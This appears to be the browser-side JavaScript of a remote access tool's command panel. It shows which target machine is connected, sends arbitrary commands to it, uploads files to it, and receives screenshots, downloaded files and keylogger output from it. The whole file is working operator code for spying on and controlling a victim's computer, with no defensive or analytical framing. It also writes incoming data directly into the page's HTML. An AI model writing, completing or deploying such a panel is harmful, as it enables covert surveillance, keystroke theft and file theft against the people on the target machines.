const socket = io();

const outputDiv = document.getElementById('output');
const keylogDiv = document.getElementById('keylog-output');
const statusIndicator = document.getElementById('status-indicator');
const statusText = document.getElementById('status-text');

socket.on('connect', () => {
    console.log('✅ Socket.IO connected');
    // The server will now automatically send the current status on connect,
    // but we keep this manual request as a backup.
    socket.emit('get_status');
});

socket.on('status', (data) => {
    if (data.connected) {
        statusIndicator.className = 'status-connected';
        statusText.textContent = `Connected to ${data.target}`;
    } else {
        statusIndicator.className = 'status-disconnected';
        statusText.textContent = 'Disconnected';
    }
});

// ... rest unchanged (response, screenshot, download, keylog_data, etc.)
socket.on('response', (data) => {
    outputDiv.innerHTML += `<div>${data.text}</div>`;
    outputDiv.scrollTop = outputDiv.scrollHeight;
});

socket.on('screenshot', (data) => {
    const img = document.createElement('img');
    img.src = 'data:image/bmp;base64,' + data.data;
    img.className = 'img-fluid mt-2';
    document.getElementById('screenshot-container').innerHTML = '';
    document.getElementById('screenshot-container').appendChild(img);
});

socket.on('download', (data) => {
    const byteString = atob(data.data);
    const ab = new ArrayBuffer(byteString.length);
    const ia = new Uint8Array(ab);
    for (let i = 0; i < byteString.length; i++) {
        ia[i] = byteString.charCodeAt(i);
    }
    const blob = new Blob([ab]);
    const link = document.createElement('a');
    link.href = URL.createObjectURL(blob);
    link.download = data.filename;
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
    outputDiv.innerHTML += `<div>Downloaded: ${data.filename}</div>`;
});

socket.on('keylog_data', (data) => {
    keylogDiv.innerHTML += data.data;
    keylogDiv.scrollTop = keylogDiv.scrollHeight;
});

function sendCmd(cmd) { socket.emit('command', { cmd }); }
function sendCustomCmd() {
    const input = document.getElementById('cmd-input');
    const cmd = input.value;
    if (cmd) { sendCmd(cmd); input.value = ''; }
}
function promptDownload() {
    const filename = prompt('Enter remote file path to download:');
    if (filename) sendCmd('download ' + filename);
}
function uploadFile() {
    const fileInput = document.getElementById('uploadFileInput');
    const file = fileInput.files[0];
    if (!file) return;
    const formData = new FormData();
    formData.append('file', file);
    fetch('/upload_file', { method: 'POST', body: formData })
        .then(res => {
            if (res.ok) {
                sendCmd('upload ' + file.name);
                document.getElementById('uploadModal').style.display = 'none';
                fileInput.value = '';
            }
        });
}
function clearKeylog() { keylogDiv.innerHTML = ''; }
document.getElementById('cmd-input').addEventListener('keypress', (e) => {
    if (e.key === 'Enter') sendCustomCmd();
});